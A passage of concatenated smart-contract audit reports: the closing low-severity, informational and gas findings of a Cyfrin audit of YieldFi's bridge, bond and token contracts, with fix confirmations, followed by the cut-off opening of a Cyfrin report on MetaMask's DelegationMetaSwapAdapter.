Chainlink CCIP supports paying fees using either the native gas token or `LINK`. By hardcoding `feeToken = address(0)`, the protocol forces all users to pay with the native gas token, removing flexibility.

This design choice simplifies implementation but has cost implications: CCIP offers a [10% fee discount](https://docs.chain.link/ccip/billing#network-fee-table) when using `LINK`, so users holding `LINK` are unable to take advantage of these reduced fees.

**Recommended Mitigation:** Consider allowing users to choose their preferred payment tokeneither `LINK` or native gasbased on their individual cost and convenience preferences.

**YieldFi:** Fixed in commits [`3cc0b23`](https://github.com/YieldFiLabs/contracts/commit/3cc0b2331c35327a43e95176ce6c5578f145c0ee) and [`e9c160f`](https://github.com/YieldFiLabs/contracts/commit/e9c160fdfd6dd90650c9537fba73c17cb3c53ea5)

**Cyfrin:** Verified.


### Chainlink router configured twice

**Description:** In `BridgeCCIP`, there is a dedicated storage slot for the CCIP router address, [`router`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/ccip/BridgeCCIP.sol#L32-L33):

```solidity
contract BridgeCCIP is CCIPReceiver, Ownable {
    address public router;
```

This value can be updated by the admin through [`BridgeCCIP::setRouter`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/ccip/BridgeCCIP.sol#L69-L73):

```solidity
function setRouter(address _router) external onlyAdmin {
    require(_router != address(0), "!router");
    router = _router;
    emit SetRouter(msg.sender, _router);
}
```

The `router` is then used in [`BridgeCCIP::send`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/ccip/BridgeCCIP.sol#L157) to send messages via CCIP:

```solidity
IRouterClient(router).ccipSend{ value: msg.value }(_dstChain, evm2AnyMessage);
```

However, the inherited `CCIPReceiver` contract already defines an immutable router address (`i_ccipRouter`), which is used to validate that incoming CCIP messages originate from the correct router.

This introduces an inconsistency: if `BridgeCCIP.router` is changed, the contract will continue to *send* messages via the new router, but *receive* messages only from the original, immutable `i_ccipRouter`. This mismatch could break cross-chain communication or make message delivery non-functional.

**Recommended Mitigation:** Since the router address in `CCIPReceiver` is immutable, any future change to the router would already require redeployment of the `BridgeCCIP` contract. Therefore, the `router` storage slot and the `setRouter` function in `BridgeCCIP` are redundant and potentially misleading. We recommend removing both and relying exclusively on the `i_ccipRouter` value inherited from `CCIPReceiver`.

**YieldFi:** Fixed in commit [`3cc0b23`](https://github.com/YieldFiLabs/contracts/commit/3cc0b2331c35327a43e95176ce6c5578f145c0ee)

**Cyfrin:** Verified. `router` removed and `i_ccipRouter` used from the inherited contract.


### Missing vesting check in `PerpetualBond::setVestingPeriod`

**Description:** Both `YToken` and `PerpetualBond` support reward vesting through a configurable vesting period. The admin can update this period via the `setVestingPeriod` function. However, there is an inconsistency in how the two contracts validate changes to the vesting period:

- [`YToken::setVestingPeriod`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L52-L56) includes a check to ensure that no rewards are currently vesting:
  ```solidity
  function setVestingPeriod(uint256 _vestingPeriod) external onlyAdmin {
      require(getUnvestedAmount() == 0, "!vesting");
      require(_vestingPeriod > 0, "!vestingPeriod");
      vestingPeriod = _vestingPeriod;
  }
  ```

- [`PerpetualBond::setVestingPeriod`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/PerpetualBond.sol#L184-L188) lacks this check:
  ```solidity
  function setVestingPeriod(uint256 _vestingPeriod) external onlyAdmin {
      // @audit-issue no check for `getUnvestedAmount() == 0`
      require(_vestingPeriod > 0, "!vestingPeriod");
      vestingPeriod = _vestingPeriod;
      emit VestingPeriodUpdated(_vestingPeriod);
  }
  ```

This means the vesting period in `PerpetualBond` can be modified even while tokens are still vesting, which could lead to inconsistent or unexpected vesting behavior.

**Recommended Mitigation:** To align with the `YToken` implementation and ensure consistency, add a check in `PerpetualBond::setVestingPeriod` to ensure `getUnvestedAmount() == 0` before allowing updates to the vesting period.

**YieldFi:** Fixed in commit [`f0bf88c`](https://github.com/YieldFiLabs/contracts/commit/f0bf88cb51a92a119cdde896c4b0118be1d1a031)

**Cyfrin:** Verified. `unvestedAmount` is now checked.


### Balance check for yield claims in `PerpetualBond::_validate` can be easily bypassed

**Description:** In [`PerpetualBond::_validate`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/PerpetualBond.sol#L312-L314), there's a check to ensure that users have a non-zero balance before claiming yield:

```solidity
// Yield claim
require(balanceOf(_caller) > 0, "!bond balance"); // Caller must hold bonds to claim yield
require(accruedRewardAtCheckpoint[_caller] > 0, "!claimable yield"); // Must have claimable yield
```

However, this check can be bypassed by holding a trivial amount, such as 1 wei, of `PerpetualBond` tokens. A more meaningful check would ensure that the user's balance exceeds the `minimumTxnThreshold`, similar to how other parts of the contract enforce value-based thresholds.

Consider updating the balance check to compare against `minimumTxnThreshold` using the bond-converted value:

```diff
- require(balanceOf(_caller) > 0, "!bond balance");
+ require(_convertToBond(balanceOf(_caller)) > minimumTxnThreshold, "!bond balance");
```

Additionally, the second check on `accruedRewardAtCheckpoint[_caller]` is redundant, since [`PerpetualBond::requestYieldClaim`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/PerpetualBond.sol#L374-L378) already performs a value-based threshold check:

```solidity
// Convert yield amount to bond tokens for threshold comparison
uint256 yieldInBondTokens = _convertToBond(claimableYieldAmount);

// Check if the yield claim is worth executing
require(yieldInBondTokens >= minimumTxnThreshold, "!min txn threshold");
```

This makes the `accruedRewardAtCheckpoint` check in `_validate` unnecessary.

**YieldFi:** Fixed in commit [`f0bf88c`](https://github.com/YieldFiLabs/contracts/commit/f0bf88cb51a92a119cdde896c4b0118be1d1a031)

**Cyfrin:** Verified. Balance check removed as the user might still have yield even if they have no tokens (sold/transferred). Yield check in `_validate` is also removed as it's redundant.

\clearpage
## Informational


### `PerpetualBond.epoch` not updated after yield distribution

**Description:** In [`PerpetualBond::distributeBondYield`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/PerpetualBond.sol#L215-L241) the caller is supposed to provide a `nonce` that matches [`epoch + 1`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/PerpetualBond.sol#L220-L221):
```solidity
function distributeBondYield(uint256 _yieldAmount, uint256 nonce) external notPaused onlyRewarder {
    require(nonce == epoch + 1, "!epoch");
```
However, `epoch` is never incremented afterwards, consider incrementing `epoch`.

**YieldFi:** Fixed in commit [`5c1f0e7`](https://github.com/YieldFiLabs/contracts/commit/5c1f0e7a805caf1d0fddbc5a15c8b6797a424467)

**Cyfrin:** Verified. `epoch` now is incremented with the new `nonce`.


### Order not eligible at `eligibleAt`

**Description:** Both in [`PerpetualBond::executeOrder`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/PerpetualBond.sol#L411) and [`Manager::executeOrder`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L208) there's a check that the order executed is still eligible:
```solidity
require(block.timestamp > order.eligibleAt, "!waitingPeriod");
```
`eligibleAt` indicates that the order should be eligible at this timestamp which is not what the check verifies. Consider changing `>` to `>=`:
```diff
- require(block.timestamp > order.eligibleAt, "!waitingPeriod");
+ require(block.timestamp >= order.eligibleAt, "!waitingPeriod");
```

**YieldFi:** Fixed in commit [`e9c160f`](https://github.com/YieldFiLabs/contracts/commit/e9c160fdfd6dd90650c9537fba73c17cb3c53ea5)

**Cyfrin:** Verified.


### `_receiverGas` check excludes minimum acceptable value

**Description:** In the LayerZero bridge contracts [`BridgeLR::send`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/BridgeLR.sol#L76) and [`BridgeMB::send`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/BridgeMB.sol#L66), there's a check to ensure the user has provided sufficient `_receiverGas`:

```solidity
require(_receiverGas > MIN_RECEIVER_GAS, "!gas");
```

The variable name `MIN_RECEIVER_GAS` suggests that the specified amount should be *inclusive*, meaning the minimum acceptable value is valid. However, the current `>` check excludes `MIN_RECEIVER_GAS` itself. To align with the semantic expectation, consider changing the comparison to `>=`:

```diff
- require(_receiverGas > MIN_RECEIVER_GAS, "!gas");
+ require(_receiverGas >= MIN_RECEIVER_GAS, "!gas");
```

Same applies to the call [`Bridge::setMIN_RECEIVER_GAS`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/Bridge.sol#L53) and the check in [`Bridge::quote`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/Bridge.sol#L85) as well.

**YieldFi:** Fixed in commit [`9aa242b`](https://github.com/YieldFiLabs/contracts/commit/9aa242b7351314fe07160e98699d8da14a1b9bc2)

**Cyfrin:** Verified.


### Unused errors

**Description:** In the library [`Common`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/libs/Common.sol#L5-L6) there are two unused errors:
```solidity
error SignatureVerificationFailed();
error BadSignature();
```
Consider removing these.

**YieldFi:** Fixed in commit [`9aa242b`](https://github.com/YieldFiLabs/contracts/commit/9aa242b7351314fe07160e98699d8da14a1b9bc2)

**Cyfrin:** Verified.


### Potential risk if callback logic is enabled in the future

**Description:** Both the `Manager` and `PerpetualBond` contracts implement a two-step process for user interactions. As part of these calls, users can provide a `_callback` address and accompanying `_callbackData`. For example, here are the parameters for [`Manager::deposit`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L144):

```solidity
function deposit(..., address _callback, bytes calldata _callbackData) external notPaused nonReentrant {
```

However, these parameters are currently not passed along when the request is stored, as shown later in [`Manager::deposit`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L153):

```solidity
uint256 receiptId = IReceipt(receipt).mint(msg.sender, Order(..., address(0), ""));
```

Here, `address(0)` and empty `""` are hardcoded instead of using the user-supplied values.

Later, in the `executeOrder` flow (e.g., [`Manager::executeOrder`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L219-L223)), the callback is conditionally executed:

```solidity
// Execute the callback
if (order.callback != address(0)) {
    (bool success, ) = order.callback.call(order.callbackData);
    require(success, "callback failed");
}
```

If the original user-provided `_callback` and `_callbackData` were passed through and used here, it would pose a serious security risk. Malicious users could exploit this to execute arbitrary external calls and potentially steal tokens that are approved to the `Manager` or `PerpetualBond` contracts.

If callback functionality is not currently intended, consider removing or disabling the `_callback` and `_callbackData` parameters entirely to avoid the risk of these being enabled in the future. Alternatively, ensure strict validation and access control if support for callbacks is added later.


**YieldFi:** Acknowledged.


### Lack of `_disableInitializers` in upgradeable contracts

**Description:** YieldFi utilizes upgradeable contracts. It's [best practice](https://docs.openzeppelin.com/upgrades-plugins/writing-upgradeable#initializing_the_implementation_contract) to disable the ability to initialize the implementation contracts.

Consider adding a constructor with the OpenZeppelin `_disableInitializers` in all the upgradeable contracts:
```solidity
constructor() {
    _disableInitializers();
}
```

**YieldFi:** Fixed in commit [`584b268`](https://github.com/YieldFiLabs/contracts/commit/584b268a75a8f7c7f10eda46efaaa3ebbe4f0159)

**Cyfrin:** Verified. Constructor with `_disableInitializers` added to all upgradeable contracts.


### Unused imports

**Description:** Consider removing the following unused imports:

- contracts/bridge/Bridge.sol [Line: 7](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/Bridge.sol#L7)
- contracts/bridge/Bridge.sol [Line: 9](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/Bridge.sol#L9)
- contracts/bridge/Bridge.sol [Line: 13](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/Bridge.sol#L13)
- contracts/bridge/Bridge.sol [Line: 15](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/Bridge.sol#L15)
- contracts/bridge/Bridge.sol [Line: 18](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/Bridge.sol#L18)
- contracts/bridge/Bridge.sol [Line: 20](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/Bridge.sol#L20)
- contracts/bridge/BridgeMB.sol [Line: 17](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/BridgeMB.sol#L17)
- contracts/bridge/ccip/BridgeCCIP.sol [Line: 4](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/ccip/BridgeCCIP.sol#L4)
- contracts/bridge/ccip/BridgeCCIP.sol [Line: 13](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/ccip/BridgeCCIP.sol#L13)
- contracts/core/Manager.sol [Line: 6](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L6)
- contracts/core/Manager.sol [Line: 15](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L15)
- contracts/core/Manager.sol [Line: 17](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L17)
- contracts/core/OracleAdapter.sol [Line: 6](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/OracleAdapter.sol#L6)
- contracts/core/PerpetualBond.sol [Line: 7](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/PerpetualBond.sol#L7)
- contracts/core/PerpetualBond.sol [Line: 13](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/PerpetualBond.sol#L13)
- contracts/core/interface/IPerpetualBond.sol [Line: 4](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/interface/IPerpetualBond.sol#L4)
- contracts/core/l1/LockBox.sol [Line: 10](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/l1/LockBox.sol#L10)
- contracts/core/l1/LockBox.sol [Line: 13](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/l1/LockBox.sol#L13)
- contracts/core/l1/Yield.sol [Line: 5](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/l1/Yield.sol#L5)
- contracts/core/l1/Yield.sol [Line: 10](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/l1/Yield.sol#L10)
- contracts/core/l1/Yield.sol [Line: 11](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/l1/Yield.sol#L11)
- contracts/core/l1/Yield.sol [Line: 12](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/l1/Yield.sol#L12)
- contracts/core/l1/Yield.sol [Line: 13](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/l1/Yield.sol#L13)
- contracts/core/l1/Yield.sol [Line: 14](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/l1/Yield.sol#L14)
- contracts/core/l1/Yield.sol [Line: 16](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/l1/Yield.sol#L16)
- contracts/core/tokens/YToken.sol [Line: 8](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L8)
- contracts/core/tokens/YToken.sol [Line: 14](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L14)
- contracts/core/tokens/YTokenL2.sol [Line: 12](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YTokenL2.sol#L12)

**YieldFi:** Fixed in commit [`8264429`](https://github.com/YieldFiLabs/contracts/commit/826442914cb9829aa302dbaef0741659cc5a1a67)

**Cyfrin:** Verified.


### Unused constants

**Description:** In `Constants.sol` there are a some unused constants, consider removing thses:
* [#L21: `SIGNER_ROLE`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/libs/Constants.sol#L21)
* [#L38: `VESTING_PERIOD`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/libs/Constants.sol#L38)
* [#L41 `MAX_COOLDOWN_PERIOD`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/libs/Constants.sol#L41)
* [#L44: `MIN_COOLDOWN_PERIOD`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/libs/Constants.sol#L44)
* [#L47 `ETH_SIGNED_MESSAGE_PREFIX`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/libs/Constants.sol#L47)
* [#L50`REWARD_HASH`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/libs/Constants.sol#L50)
* [#L56-L59 `DEPOSIT`, `WITHDRAW`, `DEPOSIT_L2`, `WITHDRAW_L2`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/libs/Constants.sol#L56-L59)

**YieldFi:** Fixed in commit [`125ec4a`](https://github.com/YieldFiLabs/contracts/commit/125ec4a944c436e587d7380b8c4bf6232d3264aa)

**Cyfrin:** Verified.


### Lack of event emissions on important state changes

**Description:** The following functions change state but doesn't emit an event. Consider emitting an event from the following:


- [`Access::setAdministrator`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/administrator/Access.sol#L76)
- [`Administrator::cancelAdminRole`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/administrator/Administrator.sol#L109)
- [`Administrator::cancelTimeLockUpdate`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/administrator/Administrator.sol#L148)
- [`Bridge::setMIN_RECEIVER_GAS`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/Bridge.sol#L52)
- [`BridgeMB::setManager`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/BridgeMB.sol#L42)
- [`BridgeCCIP::setManager`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/ccip/BridgeCCIP.sol#L82)
- [`Manager::setTreasury`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L52)
- [`Manager::setReceipt`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L61)
- [`Manager::setCustodyWallet`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L71)
- [`Manager::setMinSharesInYToken`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L81)
- [`OracleAdapter::setStaleThreshold`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/OracleAdapter.sol#L48)
- [`LockBox::setManager`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/l1/LockBox.sol#L31)
- [`YToken::setManager`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L42)
- [`YToken::setYield`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L47)
- [`YToken::setVestingPeriod`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L52)
- [`YToken::setFee`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L62)
- [`YToken::setGasFee`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L72)
- [`YToken::updateTotalAssets`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L179)
- [`YTokenL2::setManager`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YTokenL2.sol#L83)
- [`YTokenL2::setFee`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YTokenL2.sol#L92)
- [`YTokenL2::setGasFee`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YTokenL2.sol#L102)


**YieldFi:** Fixed in commit [`b978ddf`](https://github.com/YieldFiLabs/contracts/commit/b978ddfc6ba8299a6045fde5e065f5fc276c02f7)

**Cyfrin:** Verified.


### Access to `LockBox::unlock` doesn't follow principle of least privilege

**Description:** The function [`LockBox::unlock`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/l1/LockBox.sol#L97) has the modifier [`onlyBridgeOrLockBox`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/administrator/Access.sol#L37-L40) which allows callers with either the role `BRIDGE_ROLE` or `LOCKBOX_ROLE` to access the call.

The function is however only called from the bridge contracts. Consider removing the access from the `LOCKBOX_ROLE` to follow principle of least privileges.

**YieldFi:** Fixed in commit [`f0c751a`](https://github.com/YieldFiLabs/contracts/commit/f0c751a25d3cf8d46661f7508b72193c88e6fc91)

**Cyfrin:** Verified.

\clearpage
## Gas Optimization


### `BridgeCCIP.isL1` can be immutable

**Description:** [`BridgeCCIP.isL1`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/ccip/BridgeCCIP.sol#L34) is only [assigned](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/bridge/ccip/BridgeCCIP.sol#L44) in the constructor. Therefore it can be made immutable as immutable values are cheaper to read.

Consider making `BridgeCCIP.isL1` immutable.

**YieldFi:** Fixed in commit [`823b010`](https://github.com/YieldFiLabs/contracts/commit/823b010d74fd55fb88b31619c1a94dac2ef65ad3)

**Cyfrin:** Verified.


### `bondFaceValue` read in `PerpetualBond::_convertToBond` can be cached

**Description:** The storage value `bondFaceValue` is read twice in [`PerpetualBond::__convertToBond`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/PerpetualBond.sol#L291-L294):
```solidity
function _convertToBond(uint256 assetAmount) internal view returns (uint256) {
    if (bondFaceValue == 0) return 0; // Prevent division by zero
    return (assetAmount * 1e18) / bondFaceValue;
}
```
The value can be cached and only read once:
```solidity
function _convertToBond(uint256 assetAmount) internal view returns (uint256) {
    // cache read
    uint256 _bondFaceValue = bondFaceValue;
    if (_bondFaceValue == 0) return 0; // Prevent division by zero
    return (assetAmount * 1e18) / _bondFaceValue;
}
```

**YieldFi:** Fixed in commit [`823b010`](https://github.com/YieldFiLabs/contracts/commit/823b010d74fd55fb88b31619c1a94dac2ef65ad3)

**Cyfrin:** Verified.


### Unnecessary external call in `YToken::_decimalsOffset` and `YTokenL2::_decimalsOffset`

**Description:** In [`YToken::_decimalsOffset`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YToken.sol#L314-L316) and [`YTokenL2::_decimalsOffset`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/tokens/YTokenL2.sol#L314-L316) the decimals of the underlying token is queried:
```solidity
function _decimalsOffset() internal view virtual override returns (uint8) {
    return 18 - IERC20Metadata(asset()).decimals();
}
```
This value is however already stored in the OpenZeppelin base contract `ERC4626Upgradeable` and can be used instead of an external call.

**YieldFi:** Acknowledged.


### Order read twice in `Manager::executeOrder`

**Description:** In [`Manager::executeOrder`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L207-L214) the order data is fetched from the Receipt:
```solidity
Order memory order = IReceipt(receipt).readOrder(_receiptId);
require(block.timestamp > order.eligibleAt, "!waitingPeriod");
require(_fee <= Constants.ONE_PERCENT, "!fee");
if (order.orderType) {
    _deposit(msg.sender, _receiptId, _amount, _fee, _gas);
} else {
    _withdraw(msg.sender, _receiptId, _amount, _fee, _gas);
}
```
Then order is read again in both [`Manager::_deposit`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L252-L253):
```solidity
function _deposit(address _caller, uint256 _receiptId, uint256 _shares, uint256 _fee, uint256 _gasFeeShares) internal {
    Order memory order = IReceipt(receipt).readOrder(_receiptId);
```

and [`Manager::_withdraw`](https://github.com/YieldFiLabs/contracts/blob/40caad6c60625d750cc5c3a5a7df92b96a93a2fb/contracts/core/Manager.sol#L327-L328):
```solidity
function _withdraw(address _caller, uint256 _receiptId, uint256 _assetAmountOut, uint256 _fee, uint256 _gasFeeShares) internal {
    Order memory order = IReceipt(receipt).readOrder(_receiptId);
```

This extra read is unnecessary. Consider passing the `Order memory order` as a parameter to `Manager::_deposit` and `Manager::_withdraw` instead. Thus saving to read the data again from the receipt:
```solidity
function _deposit(..., Order memory order) internal {

function _withdraw(..., Order memory order) internal {
```

**YieldFi:** Fixed in commit [`823b010`](https://github.com/YieldFiLabs/contracts/commit/823b010d74fd55fb88b31619c1a94dac2ef65ad3)

**Cyfrin:** Verified.

\clearpage

------ FILE END car/reports_md/2025-04-24-cyfrin-yieldfi-v2.0.md ------


------ FILE START car/reports_md/2025-05-01-cyfrin-metamask-delegationFramework-part3-v2.0.md ------

**Lead Auditors**

[0kage](https://twitter.com/0kage_eth)

**Assisting Auditors**



---

# Findings
## Informational


### Missing zero address checks in DelegationMetaSwapAdapter

**Description:** Missing zero address checks in the `constructor` and `setSwapApiSigner` functions of `DelegationMetaSwapAdapter`.

```solidity

  constructor(
        address _owner,
        address _swapApiSigner,
        IDelegationManager _delegationManager,
        IMetaSwap _metaSwap,
        address _argsEqualityCheckEnforcer
    )
        Ownable(_owner)
    {
        swapApiSigner = _swapApiSigner; //@audit missing address(0) check
        delegationManager = _delegationManager; //@audit missing address(0) check
        metaSwap = _metaSwap; //@audit missing address(0) check
        argsEqualityCheckEnforcer = _argsEqualityCheckEnforcer; //@audit missing address(0) check
        emit SwapApiSignerUpdated(_swapApiSigner);
        emit SetDelegationManager(_delegationManager);
        emit SetMetaSwap(_metaSwap);
        emit SetArgsEqualityCheckEnforcer(_argsEqualityCheckEnforcer);
    }
  function setSwapApiSigner(address _newSigner) external onlyOwner {
        swapApiSigner = _newSigner; //@audit missing address(0) check
        emit SwapApiSignerUpdated(_newSigner);
    }
```



**Recommended Mitigation:** Consider adding zero address checks.

**Metamask:** Resolved in commit [6912e73](https://github.com/MetaMask/delegation-framework/commit/6912e732e2ed65699152c6bfdb46a0ed433f1263).

**Cyfrin:** Resolved.


### Ambiguous expiration timestamp validation in `DelegationMetaSwapAdapter`

**Description:** In the DelegationMetaSwapAdapter.sol contract, the _validateSignature() method uses a "greater than" (>) comparison instead of a "greater than or equal to" (>=) comparison when validating signature expiration:

```solidity
function _validateSignature(SignatureData memory _signatureData) private view {
    if (block.timestamp > _signatureData.expiration) revert SignatureExpired();

    bytes32 messageHash_ = keccak256(abi.encodePacked(_signatureData.apiData, _signatureData.expiration));
